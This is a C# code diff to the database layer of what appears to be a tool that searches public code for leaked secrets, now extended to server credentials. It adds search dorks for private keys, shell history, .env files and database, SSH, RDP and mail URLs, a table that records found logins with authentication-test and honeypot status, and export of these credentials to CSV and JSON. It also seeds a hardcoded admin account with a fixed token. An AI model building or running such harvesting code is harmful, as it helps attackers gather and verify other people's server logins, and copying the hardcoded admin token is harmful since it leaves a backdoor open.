@@ -51,7 +51,37 @@ public class DatabaseService(DBContext dbContext)
         // Seed default queries if database is empty or queries are missing
         await SeedDefaultQueriesAsync(dbContext);
 
+        // Seed default admin subscriber node token for testing/dashboard access
+        await SeedDefaultAdminNodeTokenAsync(dbContext);
+
         return dbContext;
+    }
+
+    private async Task SeedDefaultAdminNodeTokenAsync(DBContext context)
+    {
+        try
+        {
+            var hasDefaultAdmin = await context.TelegramSubscribers.AnyAsync(s => s.TelegramId == 12345678 || s.NodeToken == "default_admin_token_2026");
+            if (!hasDefaultAdmin)
+            {
+                var defaultAdmin = new TelegramSubscriber
+                {
+                    TelegramId = 12345678,
+                    Username = "admin_test",
+                    IsAdmin = true,
+                    NodeToken = "default_admin_token_2026",
+                    SubscriptionExpiryUtc = DateTime.UtcNow.AddYears(10),
+                    CreatedAtUtc = DateTime.UtcNow
+                };
+                context.TelegramSubscribers.Add(defaultAdmin);
+                await context.SaveChangesAsync();
+                Console.WriteLine("[DB] Seeded default admin subscriber with node token: default_admin_token_2026");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[DB] Failed to seed default admin subscriber: {ex.Message}");
+        }
     }
 
     private async Task EnsureAllTableColumnsExistAsync(DBContext context)
@@ -203,6 +233,36 @@ public class DatabaseService(DBContext dbContext)
                     ""Description"" TEXT
                 );");
 
+            // 8. ServerCredentials
+            await context.Database.ExecuteSqlRawAsync(@"
+                CREATE TABLE IF NOT EXISTS ""ServerCredentials"" (
+                    ""Id"" INTEGER PRIMARY KEY AUTOINCREMENT,
+                    ""CredentialType"" TEXT NOT NULL,
+                    ""Host"" TEXT NOT NULL,
+                    ""Port"" INTEGER NOT NULL DEFAULT 0,
+                    ""Username"" TEXT,
+                    ""PasswordHash"" TEXT,
+                    ""Domain"" TEXT,
+                    ""NetworkStatus"" TEXT NOT NULL DEFAULT 'Unknown',
+                    ""AuthenticationStatus"" TEXT NOT NULL DEFAULT 'Untested',
+                    ""ServerMetadata"" TEXT NOT NULL DEFAULT '{}',
+                    ""GeolocationData"" TEXT NOT NULL DEFAULT '{}',
+                    ""OSINTData"" TEXT NOT NULL DEFAULT '{}',
+                    ""RiskLevel"" TEXT NOT NULL DEFAULT 'Low',
+                    ""IsHoneypot"" BOOLEAN NOT NULL DEFAULT 0,
+                    ""SourceRepository"" TEXT,
+                    ""SourceFilePath"" TEXT,
+                    ""SurroundingContext"" TEXT,
+                    ""EntropyScore"" DOUBLE DEFAULT 0,
+                    ""DiscoveredAt"" DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+                    ""LastVerifiedAt"" DATETIME,
+                    CONSTRAINT ""uq_server_cred"" UNIQUE (""Host"", ""Port"", ""Username"", ""CredentialType"")
+                );
+                CREATE INDEX IF NOT EXISTS ""idx_sc_type"" ON ""ServerCredentials"" (""CredentialType"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_risk"" ON ""ServerCredentials"" (""RiskLevel"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_auth_status"" ON ""ServerCredentials"" (""AuthenticationStatus"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_honeypot"" ON ""ServerCredentials"" (""IsHoneypot"");");
+
             Console.WriteLine("[DB] SQLite schema stabilization completed successfully.");
         }
         catch (Exception ex)
@@ -322,6 +382,55 @@ public class DatabaseService(DBContext dbContext)
                     ""Description"" TEXT
                 );");
 
+            // 8. ServerCredentials
+            await context.Database.ExecuteSqlRawAsync(@"
+                CREATE TABLE IF NOT EXISTS ""ServerCredentials"" (
+                    ""Id"" SERIAL PRIMARY KEY,
+                    ""CredentialType"" VARCHAR(50)  NOT NULL,
+                    ""Host"" VARCHAR(255) NOT NULL,
+                    ""Port"" INTEGER      NOT NULL DEFAULT 0,
+                    ""Username"" VARCHAR(255),
+                    ""PasswordHash"" VARCHAR(64),
+                    ""Domain"" VARCHAR(255),
+                    ""NetworkStatus"" VARCHAR(50)  NOT NULL DEFAULT 'Unknown',
+                    ""AuthenticationStatus"" VARCHAR(50)  NOT NULL DEFAULT 'Untested',
+                    ""ServerMetadata"" JSONB        NOT NULL DEFAULT '{}',
+                    ""GeolocationData"" JSONB        NOT NULL DEFAULT '{}',
+                    ""OSINTData"" JSONB        NOT NULL DEFAULT '{}',
+                    ""RiskLevel"" VARCHAR(20)  NOT NULL DEFAULT 'Low',
+                    ""IsHoneypot"" BOOLEAN      NOT NULL DEFAULT FALSE,
+                    ""SourceRepository"" VARCHAR(500),
+                    ""SourceFilePath"" VARCHAR(500),
+                    ""SurroundingContext"" TEXT,
+                    ""EntropyScore"" DOUBLE PRECISION DEFAULT 0,
+                    ""DiscoveredAt"" TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
+                    ""LastVerifiedAt"" TIMESTAMPTZ,
+                    CONSTRAINT ""uq_server_cred"" UNIQUE (""Host"", ""Port"", ""Username"", ""CredentialType"")
+                );
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""CredentialType"" VARCHAR(50) NOT NULL DEFAULT 'Unknown';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""Host"" VARCHAR(255) NOT NULL DEFAULT 'Unknown';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""Port"" INTEGER NOT NULL DEFAULT 0;
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""Username"" VARCHAR(255);
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""PasswordHash"" VARCHAR(64);
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""Domain"" VARCHAR(255);
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""NetworkStatus"" VARCHAR(50) NOT NULL DEFAULT 'Unknown';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""AuthenticationStatus"" VARCHAR(50) NOT NULL DEFAULT 'Untested';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""ServerMetadata"" JSONB NOT NULL DEFAULT '{}';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""GeolocationData"" JSONB NOT NULL DEFAULT '{}';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""OSINTData"" JSONB NOT NULL DEFAULT '{}';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""RiskLevel"" VARCHAR(20) NOT NULL DEFAULT 'Low';
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""IsHoneypot"" BOOLEAN NOT NULL DEFAULT FALSE;
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""SourceRepository"" VARCHAR(500);
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""SourceFilePath"" VARCHAR(500);
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""SurroundingContext"" TEXT;
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""EntropyScore"" DOUBLE PRECISION DEFAULT 0;
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""DiscoveredAt"" TIMESTAMPTZ NOT NULL DEFAULT NOW();
+                ALTER TABLE ""ServerCredentials"" ADD COLUMN IF NOT EXISTS ""LastVerifiedAt"" TIMESTAMPTZ;
+                CREATE INDEX IF NOT EXISTS ""idx_sc_type"" ON ""ServerCredentials"" (""CredentialType"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_risk"" ON ""ServerCredentials"" (""RiskLevel"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_auth_status"" ON ""ServerCredentials"" (""AuthenticationStatus"");
+                CREATE INDEX IF NOT EXISTS ""idx_sc_honeypot"" ON ""ServerCredentials"" (""IsHoneypot"");");
+
             Console.WriteLine("[DB] Full PostgreSQL schema stabilization completed successfully.");
         }
         catch (Exception ex)
@@ -391,6 +500,12 @@ public class DatabaseService(DBContext dbContext)
                 // AWS IAM
                 "AKIA", "ASIA", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
                 "aws_access_key_id", "aws_secret_access_key",
+                // Server Credentials
+                "ssh ", "ftp://", "mysql://", "postgresql://", "mongodb://", "redis://",
+                "-----BEGIN RSA PRIVATE KEY-----", "KUBERNETES_SERVICE_HOST", "DOCKER_HOST",
+                "rdp://", "vnc://", "mstsc", "TeamViewer", "filename:.rdp", "WinRM",
+                "smtp://", "SMTP_HOST", "imap://", "pop3://", "cPanel", "WHM_USER",
+                "PLESK_", "filename:.bash_history", "filename:id_rsa", "extension:env"
             };
 
             var existingQueries = await context.SearchQueries.Select(q => q.Query).ToListAsync();
@@ -539,6 +654,32 @@ public class DatabaseService(DBContext dbContext)
             "AWS_SECRET_ACCESS_KEY",
             "aws_access_key_id",
             "aws_secret_access_key",
+            // Server Credentials
+            "ssh ",
+            "ftp://",
+            "mysql://",
+            "postgresql://",
+            "mongodb://",
+            "redis://",
+            "-----BEGIN RSA PRIVATE KEY-----",
+            "KUBERNETES_SERVICE_HOST",
+            "DOCKER_HOST",
+            "rdp://",
+            "vnc://",
+            "mstsc",
+            "TeamViewer",
+            "filename:.rdp",
+            "WinRM",
+            "smtp://",
+            "SMTP_HOST",
+            "imap://",
+            "pop3://",
+            "cPanel",
+            "WHM_USER",
+            "PLESK_",
+            "filename:.bash_history",
+            "filename:id_rsa",
+            "extension:env",
         };
 
         bool addedAny = false;
@@ -733,6 +874,9 @@ public class DatabaseService(DBContext dbContext)
             ApiTypeEnum.SendGrid or ApiTypeEnum.Mailgun or ApiTypeEnum.Slack
                 => ApiCategoryEnum.Communication,
 
+            ApiTypeEnum.ServerCredential
+                => ApiCategoryEnum.ServerCredentials,
+
             ApiTypeEnum.Mapbox
                 => ApiCategoryEnum.MapsAndLocation,
 
@@ -746,6 +890,7 @@ public class DatabaseService(DBContext dbContext)
         {
             ApiCategoryEnum.AIAndLLM => "AI & LLM",
             ApiCategoryEnum.Communication => "Communication",
+            ApiCategoryEnum.ServerCredentials => "Server Credentials",
             ApiCategoryEnum.MapsAndLocation => "Maps & Location",
             _ => "Unknown"
         };
@@ -949,6 +1094,128 @@ public class DatabaseService(DBContext dbContext)
 
         await File.WriteAllLinesAsync(filePath, lines);
     }
+
+    public async Task ExportServerCredentialsAsync(DBContext dbContext, string filePath, string format, string? typeFilter = null, string? riskFilter = null, string? authStatusFilter = null)
+    {
+        var query = dbContext.ServerCredentials.AsQueryable();
+
+        if (!string.IsNullOrEmpty(typeFilter) && typeFilter != "All")
+        {
+            query = query.Where(sc => sc.CredentialType == typeFilter);
+        }
+
+        if (!string.IsNullOrEmpty(riskFilter) && riskFilter != "All")
+        {
+            query = query.Where(sc => sc.RiskLevel == riskFilter);
+        }
+
+        if (!string.IsNullOrEmpty(authStatusFilter) && authStatusFilter != "All")
+        {
+            query = query.Where(sc => sc.AuthenticationStatus == authStatusFilter);
+        }
+
+        var credentials = await query.ToListAsync();
+
+        if (format.ToLower() == "json")
+        {
+            await ExportServerCredentialsAsJsonAsync(credentials, filePath);
+        }
+        else
+        {
+            await ExportServerCredentialsAsCsvAsync(credentials, filePath);
+        }
+    }
+
+    private async Task ExportServerCredentialsAsJsonAsync(List<ServerCredential> credentials, string filePath)
+    {
+        var exportData = credentials.Select(sc => new
+        {
+            sc.Id,
+            sc.CredentialType,
+            sc.Host,
+            sc.Port,
+            sc.Username,
+            sc.PasswordHash,
+            sc.Domain,
+            sc.NetworkStatus,
+            sc.AuthenticationStatus,
+            ServerMetadata = !string.IsNullOrEmpty(sc.ServerMetadata) ? JsonSerializer.Deserialize<object>(sc.ServerMetadata) : null,
+            GeolocationData = !string.IsNullOrEmpty(sc.GeolocationData) ? JsonSerializer.Deserialize<object>(sc.GeolocationData) : null,
+            OSINTData = !string.IsNullOrEmpty(sc.OSINTData) ? JsonSerializer.Deserialize<object>(sc.OSINTData) : null,
+            sc.RiskLevel,
+            sc.IsHoneypot,
+            sc.SourceRepository,
+            sc.SourceFilePath,
+            sc.SurroundingContext,
+            sc.EntropyScore,
+            DiscoveredAtIST = sc.DiscoveredAt.ToIst().ToString("yyyy-MM-dd HH:mm:ss"),
+            LastVerifiedAtIST = sc.LastVerifiedAt?.ToIst().ToString("yyyy-MM-dd HH:mm:ss")
+        });
+
+        var json = System.Text.Json.JsonSerializer.Serialize(exportData, new System.Text.Json.JsonSerializerOptions
+        {
+            WriteIndented = true
+        });
+
+        await File.WriteAllTextAsync(filePath, json);
+    }
+
+    private async Task ExportServerCredentialsAsCsvAsync(List<ServerCredential> credentials, string filePath)
+    {
+        var lines = new List<string>
+        {
+            "Id,CredentialType,Host,Port,Username,PasswordHash,Domain,NetworkStatus,AuthenticationStatus," +
+            "RiskLevel,IsHoneypot,EntropyScore,SourceRepository,SourceFilePath," +
+            "ServerMetadata,GeolocationData,OSINTData,DiscoveredAtIST,LastVerifiedAtIST"
+        };
+
+        foreach (var sc in credentials)
+        {
+            var host = sc.Host?.Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ") ?? "";
+            var username = sc.Username?.Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ") ?? "";
+            var domain = sc.Domain?.Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ") ?? "";
+            var sourceRepo = sc.SourceRepository?.Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ") ?? "";
+            var sourcePath = sc.SourceFilePath?.Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ") ?? "";
+
+            var flatMetadata = FlattenJson(sc.ServerMetadata).Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ");
+            var flatGeo = FlattenJson(sc.GeolocationData).Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ");
+            var flatOsint = FlattenJson(sc.OSINTData).Replace("\"", "\"\"").Replace("\n", " ").Replace("\r", " ");
+
+            lines.Add($"{sc.Id},\"{sc.CredentialType}\",\"{host}\",{sc.Port},\"{username}\",\"{sc.PasswordHash}\",\"{domain}\"," +
+                      $"\"{sc.NetworkStatus}\",\"{sc.AuthenticationStatus}\",\"{sc.RiskLevel}\",{sc.IsHoneypot}," +
+                      $"{sc.EntropyScore},\"{sourceRepo}\",\"{sourcePath}\",\"{flatMetadata}\",\"{flatGeo}\",\"{flatOsint}\"," +
+                      $"\"{sc.DiscoveredAt.ToIst():yyyy-MM-dd HH:mm:ss}\",\"{sc.LastVerifiedAt?.ToIst():yyyy-MM-dd HH:mm:ss}\"");
+        }
+
+        await File.WriteAllLinesAsync(filePath, lines);
+    }
+
+    private string FlattenJson(string? json)
+    {
+        if (string.IsNullOrEmpty(json) || json == "{}")
+            return "";
+        try
+        {
+            using var doc = JsonDocument.Parse(json);
+            var pairs = new List<string>();
+            foreach (var prop in doc.RootElement.EnumerateObject())
+            {
+                var valStr = prop.Value.ValueKind switch
+                {
+                    JsonValueKind.Object => prop.Value.GetRawText(),
+                    JsonValueKind.Array => prop.Value.GetRawText(),
+                    _ => prop.Value.ToString()
+                };
+                pairs.Add($"{prop.Name}: {valStr}");
+            }
+            return string.Join(" | ", pairs);
+        }
+        catch
+        {
+            return json ?? "";
+        }
+    }
+
 
     public async Task<int> PurgeInvalidReferencesAsync(DBContext context)
     {
